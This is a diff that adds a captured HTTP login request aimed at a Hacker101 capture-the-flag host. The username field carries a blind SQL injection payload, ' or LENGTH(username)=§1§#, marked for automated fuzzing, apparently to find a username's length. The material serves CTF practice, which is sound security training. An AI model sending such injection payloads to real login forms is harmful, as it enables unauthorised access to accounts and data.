@@ -1,0 +1,22 @@
+POST /login HTTP/2
+Host: 79032283a013ae184a429ee66eeb61b3.ctf.hacker101.com
+Content-Length: 35
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: es-419
+Upgrade-Insecure-Requests: 1
+Origin: https://79032283a013ae184a429ee66eeb61b3.ctf.hacker101.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://79032283a013ae184a429ee66eeb61b3.ctf.hacker101.com/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+username=' or LENGTH(username)=§1§#&password=
